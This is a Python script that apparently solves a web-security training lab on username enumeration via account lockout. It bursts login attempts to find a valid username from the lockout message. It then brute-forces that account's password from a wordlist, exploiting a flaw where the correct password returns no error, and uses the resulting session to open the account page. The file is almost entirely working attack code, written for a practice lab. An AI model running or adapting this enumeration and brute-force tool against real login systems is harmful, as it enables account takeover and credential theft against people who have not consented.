#######################################################################
#
# Lab: Username enumeration via account lock
#
# Hack Steps: 
#      1. Read usernames and passwords lists
#      2. Burst several login attempts for each user. The valid one will
#         eventually get locked and reply "too many incorrect login
#         attempts"
#      3. Brute force the password of that valid username. Thanks to the
#         logic flaw, the correct password is the only response that has
#         no error message (even while the account is locked)
#      4. Wait for the lock to reset and login with the valid credentials
#      5. Access the account page
#
#######################################################################
import requests
import time
import os
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a190081044bf859800e3f450043002e.web-security-academy.net"

# The account gets locked after a few wrong attempts. We repeat each
# username this many times in a row so the lock message can show up.
ATTEMPTS_PER_USER = 5

SCRIPT_START_TIME = time.time()

def main():
    print("⦗1⦘ Reading usernames list.. ", end="", flush=True)

    usernames_list = read_list(os.path.join(os.path.dirname(os.path.abspath(__file__)), "usernames.txt"))

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Reading password list.. ", end="", flush=True)

    password_list = read_list(os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.txt"))

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Trying to find a valid username.. ")

    valid_user = try_to_find_valid_username(usernames_list)  

    print(Fore.WHITE + "\n🗹 Valid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "⦗4⦘ Brute forcing password.. ")

    (valid_password, valid_session) = brute_force_password(valid_user, password_list)  
    
    print(Fore.WHITE + "\n🗹 Valid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "🗹 Valid password: " + Fore.GREEN + valid_password)

    print(Fore.WHITE + "⦗5⦘ Accessing the account page.. ", end="", flush=True)

    cookies = { "session": valid_session }
    account_page = fetch("/my-account", cookies)

    if account_page.status_code == 200 and valid_user in account_page.text:
        print(Fore.GREEN + "OK")
    else:
        print(Fore.RED + "⦗!⦘ Could not access the account page")
        exit(1)

    print_finish_message()


def read_list(file_path):
    try:
        return open(file_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "⦗!⦘ Failed to opent the file " + file_path + " through exception")
        exit(1)


def try_to_find_valid_username(usernames_list):
    total_users = len(usernames_list)  
    
    for counter, user in enumerate(usernames_list):
        # Burst several attempts for the SAME user in a row, otherwise the
        # failed-attempt counter may reset before it reaches the lock limit.
        for _ in range(ATTEMPTS_PER_USER):
            print_progress(counter, total_users, user)
            
            try_to_login = login(user, "not important")

            if has_lock_message(try_to_login):
                return user  
    
    print(Fore.RED + "⦗!⦘ No valid username was found")
    exit(1)


def brute_force_password(valid_user, passwords):
    total_passwords = len(passwords)  
    
    for (counter, password) in enumerate(passwords):
        print_progress(counter, total_passwords, password)
        
        try_to_login = login(valid_user, password)

        # If the account is not locked, a correct password redirects
        # straight away, so we already have the session.
        if try_to_login.status_code == 302:
            session = try_to_login.cookies.get("session")
            return (password, session)

        # A wrong password always comes back with an error message:
        # "Invalid username or password" (not locked yet) or
        # "too many incorrect login attempts" (locked). The correct one
        # comes back with no error, that's the logic flaw.
        if is_wrong_password(try_to_login):
            continue

        print(Fore.WHITE + "\n⦗*⦘ Possible password found: " + Fore.GREEN + password)

        # The account is locked by now, so wait for it to reset and then
        # confirm the password with a real login to get a session.
        wait(65, "Waiting 1 minute for the account lock to reset")

        verified = login(valid_user, password)

        if verified.status_code == 302:
            session = verified.cookies.get("session")
            return (password, session)
        else:
            print(Fore.RED + "⦗!⦘ That was not the password, continuing..")
            
    print(Fore.RED + "\n⦗!⦘ No valid password was found")
    exit(1)


def login(username, password):
    data = { "username": username, "password": password }
    
    for attempt in range(1, 4):
        try:
            response = requests.post(f"{LAB_URL}/login", data, allow_redirects=False, timeout=15)
            
            # Retry on transient server errors (e.g. 504 from the lab proxy)
            if response.status_code >= 500:
                raise requests.RequestException(f"HTTP {response.status_code}")
            
            return response
        except:
            if attempt == 3:
                print(Fore.RED + f"\n⦗!⦘ Failed to login as {username} through exception")
                exit(1)
            time.sleep(1)


def has_lock_message(response):
    return "too many incorrect login attempts" in response.text.lower()


def is_wrong_password(response):
    if response.status_code not in (200, 302):
        return True
    if has_lock_message(response):
        return True
    if "invalid username or password" in response.text.lower():
        return True
    return False


def wait(seconds, reason):
    print(Fore.WHITE + f"\n⦗*⦘ {reason}..")
    for remaining in range(seconds, 0, -1):
        print(Fore.WHITE + "❯❯ Waiting: " + Fore.YELLOW + f"{remaining:3d}s" +
               Fore.WHITE + " remaining..", end='\r', flush=True)
        time.sleep(1)
    print(" " * 60, end='\r', flush=True)


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False, timeout=15)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def print_progress(counter, total_counts, text):
    elapsed_time = (int((time.time() - SCRIPT_START_TIME) / 60))
    print(Fore.WHITE + "❯❯ Elapsed: " + Fore.YELLOW + str(elapsed_time) +
           Fore.WHITE + f" minutes || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def print_finish_message():
    elapsed_time = int((time.time() - SCRIPT_START_TIME) / 60)     
    print(Fore.WHITE + "🗹 Finished in: " + Fore.YELLOW + str(elapsed_time) + Fore.WHITE + " minutes")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


if __name__ == "__main__":
    main()
